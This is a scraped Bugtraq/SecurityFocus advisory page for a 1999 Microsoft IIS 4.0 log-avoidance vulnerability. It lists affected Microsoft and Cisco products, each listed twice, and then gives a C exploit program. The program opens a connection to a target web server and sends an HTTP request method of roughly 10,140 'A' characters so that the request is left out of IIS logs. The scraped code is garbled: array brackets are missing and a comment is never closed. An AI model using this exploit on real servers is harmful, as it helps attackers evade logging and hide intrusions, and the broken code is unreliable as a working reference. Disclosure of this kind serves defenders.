#bid191<p><b><span style="font-size: 18pt;">NT IIS4 Log Avoidance Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/191/info">info</a><br><a href="http://www.securityfocus.com/bid/191/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/191/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/191/solution">solution</a><br><a href="http://www.securityfocus.com/bid/191/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				191
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Failure to Handle Exceptional Conditions
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Unknown
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jan 22 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jan 22 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was posted to NTBugtraq by David Litchfield (Mnemonix)
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft IIS  4.0<br/>
<span class="related">
						
							+ 
						
						Cisco Building Broadband Service Manager (BBSM) 5.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Building Broadband Service Manager (BBSM) 5.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco IP/VC 3540 Video Rate Matching Module  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco IP/VC 3540 Video Rate Matching Module  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.4 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.4 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.3 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.3 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.2 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.2 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 4.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 4.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Hancom Hancom Office 2007  0<br/>
</span>
<span class="related">
						
							+ 
						
						Hancom Hancom Office 2007  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft BackOffice  4.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft BackOffice  4.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT 4.0 Option Pack  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT 4.0 Option Pack  <br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<br/>/* Compile with eg Visual C++ and link with wsock32.lib<br/><br/>#include &lt;stdio.h&gt;<br/>#include &lt;winsock2.h&gt;<br/>#include &lt;string.h&gt;<br/><br/><br/>int main (int argc, char *argv)<br/>{<br/> int snd, rcv, err, portno,a=0,b, res;<br/> char resp1024;<br/> WORD wVersionRequested;<br/> WSADATA wsaData;<br/> struct sockaddr_in sa;<br/> struct hostent *he;<br/> SOCKET sock;<br/><br/> if (argc !=2)<br/>  {<br/>   printf("Usage:\nc:\\&gt;%s target_machine\n\nDavid Litchfield\n21st January<br/>1999\n", argv0);<br/>   return 0;<br/>  }<br/> wVersionRequested = MAKEWORD( 2, 0 );<br/> err = WSAStartup( wVersionRequested, &amp;wsaData );<br/><br/> if ( err != 0 )<br/>  {<br/>   printf("No winsock.dll\n");<br/>   return 0;<br/>  }<br/> if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )<br/>  {<br/>       printf("No winsock.dll - 2nd\n");<br/>       WSACleanup( );<br/>       return 0;<br/>  }<br/><br/> if ((he = gethostbyname(argv1)) == NULL)<br/>  {<br/>   printf("Invalid Host\n");<br/>   return 0;<br/>  }<br/><br/><br/><br/><br/> sock=socket(AF_INET,SOCK_STREAM,0);<br/> if (sock==INVALID_SOCKET)<br/>  {<br/>   printf("Invalid Socket!\n");<br/>   return 0;<br/>  }<br/> else<br/>  {<br/>   printf("");<br/>  }<br/><br/> sa.sin_addr.s_addr=INADDR_ANY;<br/> sa.sin_family=AF_INET;<br/><br/><br/><br/> bind(sock,(struct sockaddr *)&amp;sa,sizeof(sa));<br/><br/><br/><br/> sa.sin_port=htons(80);<br/><br/> memcpy(&amp;sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);<br/> if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa)) &lt; 0)<br/>  {<br/>       printf("Failed to connect!\n");<br/>  }<br/> else<br/>  {<br/><br/>/* This loop creates the REQUEST_METHOD and makes it 10140 bytes long<br/><br/>   while (a &lt; 10141)<br/>    {<br/>          snd=send(sock,"A", 1, 0);<br/>     a ++;<br/>    }<br/>   snd=send(sock," /default.asp HTTP/1.0\n\n",43,0);<br/>   rcv=recv(sock,resp,256,0);<br/>   printf("\n%s",resp);<br/>   rcv=recv(sock,resp,1024,0);<br/>   printf("\n%s\n\n",resp);<br/><br/>    }<br/><br/><br/> closesocket(sock);<br/><br/>return 0;<br/>}
	
		<ul>
</ul>
</div>